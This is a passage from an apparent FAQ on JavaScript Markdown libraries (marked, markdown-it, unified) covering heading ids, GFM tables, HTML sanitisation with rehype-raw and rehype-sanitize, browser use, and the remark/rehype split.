DOMPurify, sanitize-html or insane (checked on github.com, 9 September 2026). The old `sanitize`
option has been removed, so code passing it is being silently ignored, which is worse than having
no protection because it looks like protection.

### How do I add ids to headings for a table of contents?

In marked, override the `heading` renderer method or add the `marked-gfm-heading-id` package. In
markdown-it, use an anchor plugin or override the `heading_open` renderer rule. In unified, add a
plugin that walks the tree. Whichever you choose, prefix the id — a bare id becomes a named property
on `window`, and a prefix like `doc-` ends both the collision and the clobbering risk.

### Why is my table rendering as a paragraph of pipes?

Tables are not in CommonMark, so a strictly compliant parse does not produce one. Check `gfm` in
marked, check that you have not selected the `commonmark` preset in markdown-it, and check that
`remark-gfm` is in your unified pipeline. The failure is silent by design: a table the parser does
not recognise is a valid paragraph.

### Do I need rehype-raw?

Only if the Markdown contains raw HTML that you want rendered. `remark-rehype` drops raw HTML
otherwise, which is the safe default. If you do add it, you need `allowDangerousHtml` on
`remark-rehype` as well, and then `rehype-sanitize` after both — the middle of that sequence is the
part where an unsanitised document exists.

### Can I use these libraries in a browser without a bundler?

Yes. marked, markdown-it, micromark and snarkdown all run in a browser and can be loaded from a CDN
as ES modules. The unified packages are ESM only, which makes them straightforward as modules and
awkward as a script tag. Remember that a sanitiser has to load too — a renderer alone in the page is
the hole this article is about.

### What is the difference between remark and rehype?

They are two halves of the same pipeline working on two different trees. remark works on mdast, the
Markdown tree, where the nodes are headings and lists and links. rehype works on hast, the HTML
tree, where the nodes are elements with tag names and properties. `remark-rehype` is the bridge, and
knowing which side your problem lives on is most of learning unified.
